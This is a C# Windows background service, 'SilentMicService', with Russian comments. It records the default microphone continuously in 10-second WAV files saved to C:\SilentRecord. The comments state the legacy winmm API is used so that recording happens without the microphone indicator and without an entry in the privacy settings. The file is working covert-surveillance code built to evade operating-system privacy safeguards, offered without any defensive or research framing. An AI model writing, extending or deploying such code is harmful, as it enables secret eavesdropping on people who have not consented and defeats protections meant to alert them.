using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;

namespace SilentMicService
{
    public class Worker : BackgroundService
    {
        // Папка, куда будут сохраняться записи (можно изменить)
        private const string OutputFolder = @"C:\SilentRecord";

        // ===============================
        // P/Invoke — прямой вызов функций winmm.dll (старый MME API)
        // Это единственный способ в 2025 году записывать без индикатора и без списка в приватности
        // ===============================

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInGetNumDevs(); // Сколько микрофонов в системе

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInOpen(out IntPtr lphWaveIn, uint uDeviceID, ref WaveFormat lpFormat, IntPtr dwCallback, IntPtr dwInstance, uint dwFlags);

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInPrepareHeader(IntPtr hWaveIn, ref WaveHdr lpWaveInHdr, uint cbWaveHdr);

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInAddBuffer(IntPtr hWaveIn, ref WaveHdr lpWaveInHdr, uint cbWaveHdr);

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInStart(IntPtr hWaveIn); // Начать запись

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInStop(IntPtr hWaveIn); // Остановить запись

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInReset(IntPtr hWaveIn); // Сбросить буфер

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInUnprepareHeader(IntPtr hWaveIn, ref WaveHdr lpWaveInHdr, uint cbWaveHdr);

        [DllImport("winmm.dll", SetLastError = true)]
        private static extern uint waveInClose(IntPtr hWaveIn); // Закрыть устройство

        // ===============================
        // Структуры из Windows API (точно как в winmm.h)
        // ===============================
        [StructLayout(LayoutKind.Sequential)]
        private struct WaveFormat
        {
            public ushort wFormatTag;       // 1 = PCM
            public ushort nChannels;        // 1 = моно
            public uint   nSamplesPerSec;   // 48000 Гц
            public uint   nAvgBytesPerSec;  // байт в секунду
            public ushort nBlockAlign;      // байт на сэмпл
            public ushort wBitsPerSample;       // 16 бит
            public ushort cbSize;           // дополнительный размер (0 для PCM)
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct WaveHdr
        {
            public IntPtr lpData;           // указатель на буфер с данными
            public uint dwBufferLength;      // размер буфера
            public uint dwBytesRecorded;    // сколько реально записано
            public IntPtr dwUser;           // пользовательские данные (мы используем GCHandle)
            public uint dwFlags;            // флаги
            public uint dwLoops;            // для лупов (не используем)
            public IntPtr lpNext;           // следующий заголовок (не используем)
            public IntPtr reserved;         // зарезервировано
        }

        // Константы
        const uint WAVE_MAPPER = 0xFFFFFFFF; // использовать микрофон по умолчанию
        const uint CALLBACK_NULL = 0;        // без callback-функции

        // ===============================
        // Основной цикл службы
        // ===============================
        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            // Создаём папку для записи, если её нет
            Directory.CreateDirectory(OutputFolder);

            // Бесконечный цикл записи по 10 секунд
            while (!stoppingToken.IsCancellationRequested)
            {
                Record10Seconds();
                await Task.Delay(100, stoppingToken); // небольшая пауза между файлами
            }
        }

        // ===============================
        // Запись одного файла (10 секунд)
        // ===============================
        private void Record10Seconds()
        {
            IntPtr hWaveIn = IntPtr.Zero;

            // Формат записи: 48 кГц, 16 бит, моно
            WaveFormat format = new WaveFormat
            {
                wFormatTag = 1,
                nChannels = 1,
                nSamplesPerSec = 48000,
                wBitsPerSample = 16,
                nBlockAlign = 2,
                nAvgBytesPerSec = 96000,
                cbSize = 0
            };

            // Открываем микрофон
            uint result = waveInOpen(out hWaveIn, WAVE_MAPPER, ref format, IntPtr.Zero, IntPtr.Zero, CALLBACK_NULL);
            if (result != 0 || hWaveIn == IntPtr.Zero) return; // если ошибка — ошибка, выходим

            // Буфер на 10 секунд
            byte[] buffer = new byte[48000 * 2 * 10];
            GCHandle gch = GCHandle.Alloc(buffer, GCHandleType.Pinned);

            WaveHdr hdr = new WaveHdr
            {
                lpData = gch.AddrOfPinnedObject(),
                dwBufferLength = (uint)buffer.Length,
                dwFlags = 0
            };

            // Подготавливаем заголовок и буфер
            waveInPrepareHeader(hWaveIn, ref hdr, (uint)Marshal.SizeOf<WaveHdr>());
            waveInAddBuffer(hWaveIn, ref hdr, (uint)Marshal.SizeOf<WaveHdr>());

            // Начинаем запись
            waveInStart(hWaveIn);

            // Ждём 10 секунд
            Thread.Sleep(10000);

            // Останавливаем и сбрасываем
            waveInStop(hWaveIn);
            waveInReset(hWaveIn);

            // Формируем имя файла с датой
            string fileName = Path.Combine(OutputFolder, $"record_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.wav");

            // Записываем WAV-файл
            using (FileStream fs = new FileStream(fileName, FileMode.Create))
            using (BinaryWriter bw = new BinaryWriter(fs))
            {
                // WAV-заголовок
                bw.Write("RIFF".ToCharArray());
                bw.Write(36 + hdr.dwBytesRecorded);
                bw.Write("WAVEfmt ".ToCharArray());
                bw.Write(16);
                bw.Write((short)1);
                bw.Write((short)1);
                bw.Write(48000);
                bw.Write(96000);
                bw.Write((short)2);
                bw.Write((short)16);
                bw.Write("data".ToCharArray());
                bw.Write(hdr.dwBytesRecorded);
                bw.Write(buffer, 0, (int)hdr.dwBytesRecorded);
            }

            // Очистка
            waveInUnprepareHeader(hWaveIn, ref hdr, (uint)Marshal.SizeOf<WaveHdr>());
            waveInClose(hWaveIn);
            gch.Free();
        }
    }
}